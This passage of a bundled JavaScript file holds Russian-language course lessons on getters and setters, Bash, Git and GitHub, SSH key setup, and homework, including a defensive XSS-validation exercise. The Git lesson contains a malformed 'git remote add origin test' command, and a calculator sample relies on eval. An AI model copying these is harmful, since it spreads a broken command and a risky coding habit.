this.setPriceUSD()\n    }.bind(this)\n  })\n\n  const usd = Object.assign(this.addElem('div', card ), {\n    style: `\n      padding: 16px 0 0 0;\n      font-size: 0.8rem;\n      color: #888;\n    `\n  })\n\n  this.addElem('small', usd).innerText = 'Price (USD): '\n\n  const priceUSDElement = Object.assign(this.addElem('small', usd), {\n    style: 'color: #f50'\n  })\n\n  this.setPriceUSD()\n}\n\nObject.assign(Commodity.prototype, {\n  course: course.value,\n  addElem (tagName, container) {\n    return (container ? container : section)\n      .appendChild(document.createElement(tagName))\n  }\n})\n~~~\n\nNow we are ready to create commodities\n\n~~~js\n\nconst [iron, fryingPan, saucepan] = ['iron', 'frying-pan', 'saucepan']\n  .map(name => `${location.origin + location.pathname}images/lessons/${name}.jpg`)\n\nconst commodities = [\n  new Commodity('Iron', 43, iron),\n  new Commodity('Frying pan', 22, fryingPan),\n  new Commodity('Saucepan', 25, saucepan)\n]\n~~~\n\n^^^\n_____________________________________________________\n\nДля вычисляемых свойств \"под капотом\" операция присваивания заменяется вызовом функции-сеттера.\n\n![ico-20 warn] Поэтому категорически нельзя внутри функции-сеттера использовать присваивание значения этому же свойству:\n\n![ico-25 err]\n\n~~~js\nvar commodity = {\n  name: 'Iron',\n  mark: 'Tefal',\n  priceUSD: 20,\n\n  get priceUAH () {\n    return this.priceUSD * course\n  },\n  set priceUAH (newPriceUAH) {\n    this.priceUAH = newPriceUAH\n  }\n}\n~~~\n\nЭто приведет к бесконечной рекурсии и генерации исключения:\n\n~► Uncaught RangeError: Maximum call stack size exceeded~\n\n____________________________________________________________\n\n## ![ico-25 cap] Calculator (sample)\n\nСоздадим простенький объект-калькулятор:\n\n~~~js\nvar calculator = {\n  firstValue: 0,\n  secondValue: 0,\n  operations: ['+', '-', '*', '/', '%'],\n  operation: '+',\n  get result () {\n    return eval(`${this.firstValue}${this.operation}${this.secondValue}`)\n  },\n  set result (newValue) {\n    for (var x of this.operations) {\n      var operands = newValue.split(x)\n      if (operands.length === 1) continue\n      this.operation = x\n      this.firstValue = Number(operands[0])\n      this.secondValue = Number(operands[1])\n      break\n    }\n  }\n}\n~~~\n\nВычисляемое свойство **~result~** этого объекта имеет геттер и сеттер\n\nКогда мы обращамся к свойству **~result~** для получения его значения, срабатывает геттер\n\n~~~js\nconsole.log(calculator.result)\n~~~\n\nЕсли же мы выполним присваивание нового значения свойству **~result~**\n\n~~~js\ncalculator.result = '5 - 8 '\n~~~\n\nсработает сеттер свойства, и в результате будут изменены значения свойств **_~firstValue~_**, **_~secondValue~_** и **_~operation~_** объекта **~calculator~**\n\n~~~console\n▼ {firstValue: 5, secondValue: 8, operations: Array(5), operation: \"-\"}\n    firstValue: 5\n    operation: \"-\"\n  ► operations: (5) [\"+\", \"-\", \"*\", \"/\", \"%\"]\n    result: (...)\n    secondValue: 8\n  ► get result: ƒ result()\n  ► set result: ƒ result( newValue )\n  ► __proto__: Object\n~~~\n\n{{{get-and-set-calculator.js}}}\n\n__________________________________________\n\n## ![ico-25 cap] Human states\n\nСоздадим вычисляемое свойство **_~state~_** объекта **~human~**\n\n~~~js\nvar human = {\n  name: 'Piter',\n  states: ['work', 'relax', 'enjoy'],\n  currentState: 0,\n\n  addState (state) {\n    this.states.push(state)\n  },\n\n  get state () {\n    return this.states[this.currentState]\n  },\n\n  set state (newState) {\n    !this.states.includes(newState) && this.addState(newState)\n    this.currentState = this.states.indexOf(newState)\n  },\n\n  showState: function () {\n    console.log(`Current state: ${this.currentState} (${this.state})`)\n  }\n}\n\nhuman.showState()\n~~~\n\n**Результат:**\n\n~~~console\nCurrent state: 0 (work)\n~~~\n\nЕсли вычисляемое свойство **_~state~_** фигурирует в левой части оператора присваивания, то вызывается сеттер свойства.\n\nСеттер проверяет наличие такого значения в массиве **~human~**.**_~states~_**, и если такого значения там нет, то добавляет его.\n\nЗатем сеттер свойства **_~state~_** устанавливает значение свойства **~human~**.**_~currentState~_** равным индексу элемента массива **~human~**.**_~states~_**, значение которого будет отображать геттер свойства **_~state~_**.\n\n\n~~~js\nhuman.state = 'swim'\n\nhuman.showState()\n~~~\n\n**Результат:**\n\n~~~console\nCurrent state: 3 (swim)\n~~~\n"},90163:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 bash] # BASH\n\n**Bourne-Again SHell**\n\n^^самый популярный интерпретатор командной строки ( **CLI** - _~command line interpreter~_ )^^\n^^в юниксоподобных системах **GNU/Linux**^^\n^^( **_GNU_** - операционная система, которая является _free software_ )^^\n\n![ico-30 bash] [**Установка**](https://gitforwindows.org/)\n\n____________________________________________________\n\n## ![ico-25 bash] CR | LF\n\nПроблема для разработчиков, работающих на разных платформах, -\nэто разные _коды символов перевода строки_ в текстовых файлах\n\n| Платформа         | символы перевода строки |\n| Windows ( и DOS ) | CR и LF                 |\n| UNIX (Linux)      | LF                      |\n| OS X              | LF                      |\n| Mac               | CR                      |\n\nЕсли открыть файл UNIX в Microsoft Notepad, он отобразит текст без разрывов строк\n\nЕсли открыть файл Windows в редакторе UNIX, в конце каждой строки будет символ CR\n\n____________________________________________________\n\n## ![ico-25 bash] Commands\n\n### ![ico-20 bash] echo\n\nвывод аргументов, разделенных пробелами, на стандартное устройство вывода\n\n••echo 'my name is Irina'••\n\nвыведет в консоль текст '_my name is Irina_'\n\n••echo 'my name is Irina' > sample.txt••\n\nв текщей папке создаст (или перезапишет) файл  **sample.txt**  с текстом '_my name is Irina_'\n\n____________________________________________________\n\n### ![ico-20 bash] cat\n\nВывод с указанного устройства ввода в файл\nимя файла для вывода следует после ~ >~\nесли устройство ввода пропущено, то вывод будет из устройства по умолчанию ( консоль )\n\n![ico-20 cap] ** 1**\n\n••$ cat > sample.txt••\n\nпосле нажатия ~Enter~ можно вводить мнострочный текст\nзавершить - ~Ctrl + D~\nВ текущей папке будет создан (или перезаписан) файл **sample.txt** с введенным текстом\n\n![ico-20 cap] ** 2**\n\n••$ cat file1.txt file2.txt file3.txt > sample.txt••\n\nсоединит содержимое файлов **file1.txt**, **file2.txt** и **file3.txt**\nи результат сохранит в файл **sample.txt**\n\nРезультат в блокноте\n\n![](illustrations/git-bash-cat.png)\n\nРезультат в Notepad++\n\n![](illustrations/git-bash-cat-1.png)\n\n____________________________________________________\n\n### ![ico-20 bash] touch\n\nКоманда  **~touch~**  в основном используется для изменения временных меток файла,\nно если файл, имя которого передано как аргумент, не существует,\nто команда  **~touch~**  создает его\n(пустым, если не указана опция  ~-c~  или  ~-h~)\n\n![ico-20 cap] ** 3**\n\n••$ touch samle.txt••\n\nЕсли файл  _samle.txt_  не существует, то  создаст пустой файл  _samle.txt_\n\nЕсли файл  _samle.txt_  существует, то  обновит время доступа/модификации файла (~timestamp~) до текущего времени\n\n![ico-20 warn] Чтобы команда touch не создавала никаких новых файлов,  можно использовать опцию ~-c~\n\n![ico-20 cap] ** 4**\n\n••$ touch samle.txt  -c••\n\n____________________________________________________\n\n### ![ico-20 bash] stat\n\nС помощью команды  **~stat~**  выведем информацию о файле  _sample.txt_ до и после выполнения команды ~touch  sample.txt~\n\n~~~console\n$ stat  sample.txt\n  touch  sample.txt\n  stat  sample.txt\n~~~\n\n••$ touch  sample.txt••\n\n![](illustrations/git-bash-stat-1.png)\n\n\n^^Как видно на скрине,  значения ^^\n^^• Access^^\n^^• Modify^^\n^^• Change^^\n^^файла ~sample.txt~ были обновлены^^\n^^содержимое файла не меняется^^\n\n____________________________________________________\n\n![ico-20 green-ok] Опция  -a\n\n\nДля изменения только времени доступа нужно использовать опцию  ~-a~\n\n~~~console\n$ stat  sample.txt\n  touch  sample.txt  -a\n  stat  sample.txt\n~~~\n\nНа скрине видно, что изменилось только время последнего доступа (~Access~) и время последнего изменения (~Change~)\n\n••$ touch  sample.txt  -a••\n\n![](illustrations/git-bash-stat-2.png)\n\n![ico-20 green-ok] Опция  -m\n\nЕсли нужно изменить только время модификации, используйте опцию **~-m~**\n\n![ico-20 green-ok] Опция  -r\n\nЗаменим время доступа и модификации файла  **_sample.txt_**\nсоответствующими временными метками файла **file1.txt**:\n\n••$ touch sample.txt -r file1.txt••\n\nОбратите внимание ( см. скрин ), что:\n\nвремя создания (~Birth~) файла **_sample.txt_**  не изменилось,\nвремя изменения (~Change~) было изменено на текущее время,\nа время доступа (~Access~) и время модификации (~Modify~)\nустановлены такими же, как у файла **file1.txt**\n\n![](illustrations/git-bash-stat-3.png)\n\n____________________________________________________\n"},98144:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-50 git-ver] Git\n\n@@@@\n\n**Распределенная система контроля версий**\n![](illustrations/Linus-Torvalds.jpg)\n(2005)\n^^**Linus Torvalds** - разработчик git^^\n\n@@@@\n\n_______________________________________________________________________________\n\nВ процессе работы над проектом вы будете вносить изменения в файлы проекта,\nи после их сохранения у вас будет последняя версия файлов.\nОднако часто бывает нужно "откатить" последние правки, отменить внесенные изменения.\nКроме того, часто в процессе разработки возникает необходимость иметь несколько версий одного и того же кода.\nИ если над проектом работают несколько человек, нужно отслеживать вклад каждого участника.\n\n![ico-20 green-ok] Система контроля версий позволяет фиксировать текущую версию проекта,\nи в случае необходимости вернуться к любой из предыдущих зафиксированных версий проекта.\n\n![ico-20 green-ok] Система контроля версий позволяет создавать отдельные ветки для различных версий и для каждого разработчика.\n_______________________________________________________________________________\n\n^^^[Краткое описание]\n\nДля каждого проекта создается отдельная папка.\nОднако обычная папка не является гит-репозиторием, т.е. в ней нет системы контроля версий.\nЧтобы сделать папку гит-репозиторием, нужно выполнить простую консольную команду, которую мы рассмотрим далее.\n\nС точки зрения разработчика есть два репозитория, в которых хранится код проекта:  \n• локальный репозиторий (на компе разработчика).\n• удаленный (**~remote~**) репозиторий (например, на ~github.com~).\n\nВсе изменения вносятся в локальном репозитории.\nКогда очередной этап работы над проектом в локальном репозитории завершен,\nвнесенные изменения фиксируются (**~commit~**),\nпосле чего отправляются в удаленный репозиторий (**~push~**).\n\nФиксация изменений - это создание очередной версии проекта в системе контроля версий.\n\nЕсли над проектом работает несколько человек, то ваша локальная версия проекта может  не отражать последние изменения в удаленном репо, сделанные другими участниками.\nПоэтому нужно синхронизировать локальную и удаленную версию.\nСначала получить последнюю версию проекта из удаленного репо (**~fetch~**)\nи выполнить слияние (**~merge~**) со своими изменениями\n(**~pull~** = **~fetch~** + **~merge~**)\nЕсли при слиянии возникли конфликты (другой разработчик внес изменения в те же файлы, что и вы), то вам придется "вручную" разрешить эти конфликты.\nЭто веская причина для того, чтобы каждый участник имел свою ветку (**~branch~**) в удаленном репо.\nБлагополучно завершив слияние, можно отправлять новую версию в удаленный репо (**~push~**).\n\n^^^\n\n____________________________________________________\n\n## ![ico-30 icon] Подготовка к работе\n\nДля начала работы нам необходимо:\n• зарегистрироваться на **github.com**, где мы будем размещать свои проекты.\n• установить редактор, в котором мы будем редактировать файлы своего проекта.\n• установить систему контроля версий, и получить в свое распоряжение интерпретатор командной строки.\n\nДля начала установим редактор кода, если у вас еще нет такого, например:\n\n@@@@\n\n[![ico-40 atom] Atom](https://atom.io/)\n[![ico-50 sublime] SublimeText](https://www.sublimetext.com/)\n\n@@@@\n\nЕсли у вас еще не установлена система контроля версий **git**, установите:\n[%%%Installing git%%%](https://gitforwindows.org/)\nПосле успешной установки в вашем распоряжении будет _интерпретатор командной строки_ ![ico-20 bash] Git BASH.\n\nТеперь зарегистрируемся на **github.com**:\n\n[%%%![ico-70 github]%%%](https://github.com/)\n^^Нажимаем кнопку **Sign up** (регистрация)^^\n\nТеперь мы готовы начинать ![ico-20 smile]\n\n____________________________________________________\n\n## ![ico-30 bash] Git BASH\n\nИнтерпретатор командной строки\n(**CLI** - _command line interpreter_)\n\n[%%%![ico-20 link] ^^Дополнительная инфо о некоторых командах Git BASH^^%%%](page/git-bash)\n\nДля создания новой папки используем консольную команду\n\n••![ico-20 bash] $ mkdir <folder name>••\n\nДля перехода в нужную папку используем команду **~cd~**\n\n![](illustrations/git-bash-cd.png)\n\nКак видите, наше местоположение ( путь к текущей папке ) подсвечивается желтым\nЗеленым подсвечен локальный пользователь\n\nДля того, чтобы созданная нами папка **git-sample** стала git-репозиторием,\nнужно выполнить команду:\n\n••![ico-20 bash] $ git init••\n\n![](illustrations/git-bash-init.png)\n\nЕсли папка, в которую мы перешли, является git-репозиторием,\nто после текущего пути в круглых скобках указывается ветка, на которой мы находимся\n^^(она подсвечивается голубым цветом)^^\n\nОбычно это ветка **~master~** - главная ветка,\nкоторая создается автоматически при создании репозитория\n\n______________________________________________________\n\n### ![ico-20 bash] git config\n\nКоманда **~git config~** позволяет управлять настройками  ~git~\n\nУстановим имя пользователя и email, которые будут использоваться во всех операциях git по умолчанию\n\n••![ico-20 bash] $ git config --global user.name "<имя>"••\n••![ico-20 bash] $ git config --global user.email <email>••\n\n^^Опция **~--global~** сообщает интерпретатору, что настройки должны быть глобальными, ^^\n^^т.е. эти же настройки будут действовать в других репозиториях, которые мы будем создавать^^\n![ico-20 warn] Указывая **_~<имя>~_** и **_~<email>~_**, будьте внимательны: они должны быть такими же, с какими вы зарегистрировались на ~github.com~\n^^Операции с удаленным репозиторием требуют аутентификации пользователя^^\n^^Это стандартная процедура для защиты репозиториев от несанкционированного доступа^^\n^^Для того, чтобы перенести сделанные изменения в **remote**, вы должны иметь права доступа к этому репо^^\n\nКоманда **~git config --list~**  выводит все настройки  ~git~\n\n![](illustrations/git-bash-config.png)\n\n____________________________________________________\n\n### ![ico-20 bash] git branch\n\nВеток в проекте может быть несколько\n\n![ico-20 green-ok] **Создать ветку  &lt;branch name>**:\n\n••![ico-20 bash] $ git branch  &lt;branch name>••\n\n![ico-20 green-ok] **Переключиться на ветку  &lt;branch name>**:\n\n••![ico-20 bash] $ git checkout &lt;branch name>••\n\n![ico-20 green-ok] **Создать ветку  &lt;branch name> и переключиться на нее**:\n\n••![ico-20 bash] $ git  checkout  -b  &lt;branch name>••\n\n![ico-20 cap] Например, создать ветку  ~develop~  и переключиться на нее:\n\n••![ico-20 bash] $ git  checkout  -b  develop••\n\n![ico-20 green-ok] **Удаление ветки  &lt;branch name>**:\n\n••![ico-20 bash] $ git branch --delete  &lt;branch name>••\n\nили:\n\n••![ico-20 bash] $ git branch -d  &lt;branch name>••\n\n![ico-20 warn] нельзя удалить ветку, на которой вы находитесь\n\n![ico-20 green-ok] **Слияние веток**\n\n••![ico-20 bash] $ git checkout develop••\n••![ico-20 bash] $ git merge master••\n\n![ico-20 warn] При слиянии веток могут возникать конфликты,\nсвязанные с изменениями, внесенными в одной ветке, и отсутствующими в другой\nНапример, если после создания ветки ~develop~ в ветку ~master~ были внесены изменения\nКонфликты слияния разрешаются вручную в редакторе\n\n![ico-20 green-ok] **Вывод списка всех веток проекта**\n\n••![ico-20 bash] $ git branch --list••\n\nПереключение между ветками в удаленном репозитории:\n\n![](illustrations/git-branch-list.png)\n\n^^^[Разрешение конфликтов слияния]\n\nНиже показано, как будет отображаться конфликт слияния в файле ~index.html~, в котором он произошел:\n\n~~~html\n&lt;html>\n   &lt;head>\n&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD\n    <link type="text/css" rel="stylesheet" media="all" href="style.css" />\n=======\n    &lt;!-- no style --\x3e\n>>>>>>> master\n   &lt;/head>\n   &lt;body>\n      &lt;h1>Hello, students!&lt;/h1>\n   &lt;/body>\n&lt;/html>\n~~~\n\nВсе, что находится между\n\n~~~html\n&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD      и       =======\n~~~\n\nобнаружено в ветке, которую мы сливаем с ~master~.\n\nНиже, между ~=======~ и ~>>>>>>> master~\nнаходится то, что было обнаружено в этом файле в ветке  ~master~.\n\nДля разрешения конфликта нужно внести соответствующие изменения\n(отредактировать файл ~index.html~).\n\n~~~html\n&lt;html>\n   &lt;head>\n      &lt;link type="text/css" rel="stylesheet" media="all" href="style.css" />\n   &lt;/head>\n   &lt;body>\n      &lt;h1>Hello, students!&lt;/h1>\n   &lt;/body>\n&lt;/html>\n~~~\n\nпосле чего сделать коммит изменений\n\n••![ico-20 bash] $ git add index.html••\n••![ico-20 bash] $ git commit -m "Merge fixed conflict"••\n\n^^^\n______________________________________________________\n\n# ![ico-50 git] github\n\n• Сервис для совместной разработки проектов.\n• Социальная сеть девелоперов.\n• Основан на git.\n\n______________________________________________________\n\nСоздание репозитория (**remote**)\n![](illustrations/create-github-repo.png)\n\nА можно клонировать существующий репозиторий,\nв результате чего вы получите локальную копию этого репозитория на своем компьютере.\n\n_________________________________________________________\n\n## ![ico-25 hw]  Упражнение 1\n\n![ico-20 green-ok] Создание репозитория на github.com\n![ico-20 green-ok] Клонирование удаленного репозитория в локальный\n![ico-20 green-ok] Отслеживаемые и неотслеживаемые файлы ( stage area )\n![ico-20 green-ok] Команда git status\n![ico-20 green-ok] Фиксация изменений\n![ico-20 green-ok] Команда remote\n![ico-20 green-ok] Команда git push\n![ico-20 green-ok] Команда git log\n\n![ico-20 bash] **git clone**\n\n**Клонирование удаленного репозитория в локальный**\n\nСоздадим новый репозиторий на ~github.com~.\nПредположим, новый репо будет иметь имя **~students_homeworks~**.\nОн пустой.\nВойдя в этот репозиторий, вы увидите такую картинку:\n\n![](illustrations/github-new-repo.png)\n\nСкопируем ссылку на репозиторий:\n\n![](illustrations/github-copy-repo-link.png)\n\nПереключимся в консоль ![ico-20 bash]\nи перейдем в любую "свободную" папку с помощью команды ~cd~.\nВ данном примере я переключаюсь в папку ~z:/home/common~:\n\n••![ico-20 bash]$ cd  z:/home/common••\n\nТеперь наберем команду ~git clone <ссылка на репозиторий>~:\n\n••![ico-20 bash]$ git clone https://github.com/garevna/students_homeworks.git••\n\n^^(для вставки скопированной ссылки воспользуйтесь контекстным меню или Shift + Ins)^^.\n\n![](illustrations/git-clone.png)\n\nТеперь в папке _~common~_ появилась  новая папка _~students_homeworks~_, в которой нет ничего, кроме папки ~.git~.\n\n![](illustrations/git-clone-result.png)\n\nОткроем эту папку в редакторе.\nДобавим файл **~README.md~**.\nВведем любой текст и сохраним файл.\n\n(создать новый файл - ~Ctrl + N~,  сохранить файл - ~Ctrl + S~).\n\nОбратите внимание, что новый файл подсвечен зеленым.\n\n![](illustrations/git-clone-readme.png)\n\n__________________________________________________\n\n![ico-20 bash] **git status**\n\nВернемся в консоль.\nПерейдем в папку _~students_homeworks~_.\nКак видно на картинке, у нас появилась ветка  ~master~.\n\nВоспользуемся командой ~git status~  для просмотра изменений состояния нашего проекта.\n\n![](illustrations/git-status-1.png)\n\n_____________________________\n\n![ico-20 bash] **git add**\n\nСозданный нами файл  README.md  подсвечен красным.\nЭто означает, что он изменен, но не отслеживается.\nНе отслеживаемые файлы не будут участвовать в дальнейших операциях.\nДавайте перенесем его в область отслеживаемых файлов (~staging area~).\nДля этого воспользуемся командой  ~git add~\n\n••![ico-20 bash]$ git add README.md••\n\nили:\n\n••![ico-20 bash]$ git add * ••\n\n^^** * ** означает включение всех измененных файлов.^^\n\n![](illustrations/git-add-1.png)\n\n_____________________________\n\n![ico-20 bash] **git commit**\n\nТеперь файл _README.md_  отображается в разделе ~"Changes to be commited"~ и подсвечен зеленым.\n\nИспользуем команду ~git commit~ для фиксации изменений:\n\n••![ico-20 bash]$ git commit -m "first commit:  README.md added"••\n\n![](illustrations/git-commit-1.png)\n\nОпция **~-m~**  позволяет написать комментарий к коммиту непосредственно в командной строке.\n\nБез этой опции при выполнении команды ~git commit~ будет запущен текстовый редактор\n^^(по умолчанию это ~vim~ или ~emacs~)^^,\nи вы должны будете ввести текст комментария в этом редакторе.\n\nОбратите внимание, что после коммита изменений команда ~git status~ возвращает\n\n••"nothing to commit, working directory clean"••\n\nЕсли посмотреть на файл в редакторе, он уже больше не подсвечен зеленым.\n\n__________________________\n\n![ico-20 bash] **git remote**\n\nТеперь посмотрим, как работает команда ~git remote~\nЛокальный репозиторий всегда должен быть связан с удаленным, который имеет URL\nURL удаленного репозитория слишком длинный,\nдля удаленного репозитория устанавливается алиас ( псевдоним )\nпо умолчанию это **~origin~**\nВ нашем примере мы клонировали удаленный репозиторий на свою машину,\nпоэтому наш локальный репозиторий автоматически был связан с удаленным с алиасом **~origin~**\nКоманда ~git remote~ без параметров вернет нам этот алиас\n\nЕсли же мы хотим увидеть URL удаленного репозитория, то следует использовать опцию  **~-v~**\n\n![](illustrations/git-remote-1.png)\n\n___________________________\n\n![ico-20 bash] **git push**\n\nТеперь воспользуемся командой ~git push~  для отправки сделанных изменений в удаленный репозиторий.\nКоманда ~git push~ требует указания алиаса удаленного репозитория и ветки, откуда и куда происходит перенос.\nЕсли имена веток локального и удаленного репозитория совпадают, то это будет одно значение  (~master~):\n\n••![ico-20 bash]$ git push origin master••\n\nЕсли же нужно, например, перенести изменения из локальной ветки ~master~ в ветку ~gh-pages~ удаленного репозитория,\nто нужно указать имена обеих веток, разделенные двоеточем:\n\n••![ico-20 bash]$ git push origin master:gh-pages••\n\n![](illustrations/git-push-1.png)\n\n![ico-20 warn] При записи в удаленный репозиторий по протоколу ~https~ приходится вводить e-mail и пароль для авторизации.\n\nМожно настроить транспортный протокол SSH,\nтогда не нужно будет каждый раз вводить свой e-mail и пароль\nпри использовании команды ~git push~.\n\nТеперь вернемся на  github.com  и обновим страницу:\n\n![](illustrations/git-push-2.png)\n\n__________________________\n\n![ico-20 bash] **git log**\n\nПосмотрим на историю наших манипуляций с репозиторием с помощью команды ~git log~\n\nКак видим, наш коммит получил длинный идентификатор:\n\n![](illustrations/git-log.png)\n\n__________________________________________________________________________\n\n## ![ico-25 hw] Упражнение 2\n\n![ico-20 green-ok] Инициализация репозитория git в существующей локальной папке\n![ico-20 green-ok] Идексация изменений\n![ico-20 green-ok] Удаление лишних файлов из  stage area\n![ico-20 green-ok] Фиксация изменений\n![ico-20 green-ok] Создание удаленного репозитория из локального репо\n\n![ico-20 bash] **git init**\n\nЕсли у нас есть локальная папка с проектом, которая не является гит-репозиторием, мы можем создать репозиторий в этой папке с помощью команды git init.\n\nНа картинке ниже:\n\nС помощью команды ~ls~ мы выводим список файлов в текущей директории.\nС помощью команды ~cd ..~  мы выходим из текущей папки на один уровень выше (в папку ~common~).\nС помощью команды ~mkdir test~ создаем папку ~test~.\nС помощью команды ~cd test~ входим в папку ~test~.\nЭто пустая папка, в ней нет git-репозитория.\nСоздаем его с помощью команды ~git init~.\nКак видно на картинке, папка ~test~  теперь отображается с веткой ~master~\n\n![](illustrations/git-init-2.png)\n\n__________________________\n\nСоздадим папку ~assets~:\n\n••![ico-20 bash]$ mkdir assets••\n\nСкопируем в эту папку несколько файлов.\nИспользуем  команду ~git status~ для получения инфо о текущем состоянии репо.\nНа картинке видно, что у нас в репо появилась не отслеживаемая папка ~assets~.\nСкопируем в нашу папку ~test~ еще пару файлов\nи опять используем команду ~git status~.\n\n![](illustrations/git-status-2.png)\n\n__________________________\n\nПроиндексируем эти изменения с помощью команды ~git add .~\n^^(точка указывает на файлы текущей папки)^^\n\nКак видим, все файлы попали в ~stage area~ - они готовы к коммиту, и подсвечены зеленым.\n\n![](illustrations/git-add-2.png)\n\n![ico-20 bash] **git rm --cached**\n\nДавайте уберем из **stage area**  файл  ~assets/style.css~:\n\n••![ico-20 bash]$ git rm --cached  assets/style.css••\n\nТеперь файл ~assets/style.css~ является не отслеживаемым (~untracked~), он подсвечен красным.\n\n![](illustrations/git-rm.png)\n\n__________________________\n\n![ico-20 bash] **git commit**\n\nОсталось сделать коммит.\n\n••![ico-20 bash]$ git commit -m "Test creating remote repo from  local"••\n\nЕсли использовать команду ~git commit~ с опцией  **~-а~**, то можно обойтись без предварительной индексации изменений\n(без команды ~git add~).\nОпция **~-а~**  означает, что перед коммитом нужно добавить все измененные файлы в ~stage area~.\nОпция **~-m~**  означает, как мы уже знаем, что комментарий к коммиту будет в командной строке.\n\n![](illustrations/git-commit-2.png)\n\nТеперь создадим новый репозиторий на ~github.com~.\n![ico-20 warn] При создании репозитория не нужно инициализировать его с файлами ~README~, ~license~ или ~gitignore~.\n\nСкопируем ссылку на репозиторий, как и в предыдущем упражнении 1.\n\n![ico-20 bash] **git remote add**\n\nТеперь "привяжем" вновь созданный удаленный репозиторий с нашим локальным репо.\nДля этого опять перейдем в git bush и введем команду:\n\n••![ico-20 bash]$ git remote add origin test https://github.com/garevna/test.git••\n\nОбратите внимание, что алиас для удаленного репо выбран не  "origin" (по умолчанию), а  "test".\nТеперь если ввести команду ~git remote~, то мы получим ~test~.\n\n![](illustrations/git-remote-2.png)\n\n__________________________\n\n![ico-20 bash] **git push**\n\nТеперь можно отправлять содержимое локального репо на удаленный\n\n••![ico-20 bash]$ git push test master••\n\n__________________________________________________________________________\n\n# ![ico-30 git] Генерация SSH-ключа\n\nС помощью SSH-ключей вы можете пушить последние коммиты\nбез ввода имени пользователя или пароля при каждом ~push~.\n\nПрежде, чем генерировать ~SSH~-ключ, проверьте его наличие с помощью команды\n\n••![ico-20 bash]$ ls -al ~/.ssh••\n\nВы получите перечень всех SSH-ключей в папке **~.ssh~**.\n\nЕсли у вас нет публичного ключа, создайте его командой:\n\n••![ico-20 bash]$ ssh-keygen -t rsa -b 4096 -C "your_email@example.com"••\n\nНа запросы:\n\n••Enter passphrase (empty for no passphrase):••\n••Enter same passphrase again:••\n\nможно просто давить ~Enter~.\n\nТеперь нужно добавить SSH-ключ в SSH-агент.\nПроверьте, что ~ssh-agent~ запущен, командой\n\n••![ico-20 bash]$ eval $(ssh-agent -s)••\n\nОна должна вернуть\n\n••Agent pid ХХХХ••\n\nгде  ~ХХХХ~ - число\n\nДобавьте секретный ключ SSH в ssh-agent\n\n••![ico-20 bash]$ ssh-add ~/.ssh/id_rsa••\n\n(если вы создали ключ с другим именем или добавляете существующий ключ с другим именем,\nзамените id_rsa на имя вашего файла закрытого ключа)\n\nОтвет будет таким:\n\n••Identity added: /c/Users/<__ваше имя__>/.ssh/id_rsa (/c/Users/<__ваше имя__>/.ssh/id_rsa)••\n\nОсталось добавить SSH-ключ в вашу учетную запись на ~github~\n\nДля этого скопируйте SSH-ключ в буфер обмена командой:\n\n••![ico-20 bash]$ clip < ~/.ssh/id_rsa.pub••\n\n^^(если команда clip не работает, можно найти скрытую папку **~.ssh~**, открыть файл в своем любимом текстовом редакторе и скопировать его содержимое в буфер обмена)^^\n\n@@@@\nВойдите в свою учетную запись на ~github~ и откройте настройки своей учетной записи:\n![](illustrations/git-ssh-1.png)\n@@@@\n\nВ панели слева выберите ~SSH and GPG keys~\n^^^[Settings]\n![](illustrations/git-ssh-2.png)\n^^^\n\n@@@@\nНажмите кнопку:\n![](illustrations/git-ssh-3.png)\n@@@@\n\nВ поле ~title~ введите любой текст, объясняющий, к каким компом / юзером связан этот ключ.\n\nВ поле ~key~ вставьте скопированный ключ.\n\nНажмите кнопку ~Add SSH key~.\n\n![](illustrations/git-ssh-4.png)\n\n__________________________________________________________________________\n\n# ![ico-30 hw] Homework\n\n^^^[Homework]\nСоздать локальный репозиторий в папке **~homeworks~** на своем компе.\n\nВ папке **~homeworks~** создать файл README.md,\nв котором описать назначение репо и указать ФИО автора.\n\nВ папку локального репозитория добавить свою фотографию.\n\nПроиндексировать все изменения в локальном репо и сделать коммит.\n\nСоздать удаленный репозиторий **~homeworks~** на ~github.com~.\n\nСвязать его с локальным репозиторием как ~homeworks~.\n\nЗапушить все изменения в удаленный репо.\n\n^^^\n\n_____________________________________________\n\n[%%%GIT%%%](https://githowto.com/)\n'},53274:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-40 hw] Homework\n\n______________________________________________________________________________\n\n## ![ico-40 require] Satisfactorily\n\nСоздайте пустой массив **~letters~**\n\nСоздайте строку из нескольких слов, например "_Backend As A Service_"\n\nНапилите код, который разбивает эту строку на массив слов и пушит в массив **~letters~** _первый символ_ каждого слова\n\nВыведите результат в консоль\n\nОбъедините все элементы массива **~letters~** в одну строку и выведите ее в консоль\n\n______________________________________________________________________________\n\n## ![ico-30 good] Fine\n\nОбъявите функцию с одним формальным параметром, которая проверяет тип данных переданного аргумента и:\n\n• если это число, возвращает текущую дату в формате ~"20.02.2019, 13:21:51"~\n• в противном случае возвращает строку ~"Неверный тип данных"~\n\nВызовите функцию\n\n______________________________________________________________________________\n\n## ![ico-30 exelent] Great\n\n[![ico-20 link] Перейдите по ссылке](samples/01)\n\nОткройте ~Chrome DevTools~\n\nВ панели навигации найдите файл  **index01.js**  (в папке  **js/**)\n\n![](illustrations/hw-02-1.png)\n\nУстановите  ~breakpoint~  на строке вызова функции   **insertUserText**  (строка 10)\n\nПерезагрузите страницу\n\nТеперь обратите внимание на функцию  **testUserText**\n\nВаша задача:  обезопасить свою страницу от внедрения вредоносного кода с помощью функции валидации  **testUserText**\n\nфункция должна вывести на страницу текст пользователя безопасным способом\n\n^^т.е. текст должен быть выведен "as is" (как есть), но код не должен быть выполнен^^\n\n_____________________________________________________________________________\n\n[![ico-20 link] XSS Filter Evasion Cheat Sheet](external/xss-injection)\n'},53497:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-40 hw] homework\n\n## ![ico-40 require] Satisfactorily\n\nОбъявите функцию без формальных параметров, которая выводит в консоль **_сама себя_** и все переданные ей аргументы.\n\nВызовите эту функцию с аргументами ~10, false, "google"~.\n\n_____________________\n\n## ![ico-30 good] Fine\n\nОбъявите функцию **~userInfo~**, которая выводит в консоль:\n\n![ico-20 green-ok] свойство "Дата регистрации: " + свойство **~data~** контекста вызова, если свойство **~registered~** имеет значение **_~true~_**.\n![ico-20 green-ok] сообщение "Незарегистрированный пользователь: " + свойство **~name~** в противном случае.\n\n(используйте переменные в литералах)\n\nСоздайте два объекта с одинаковым набором свойств:\n\n![ico-20 green-ok] 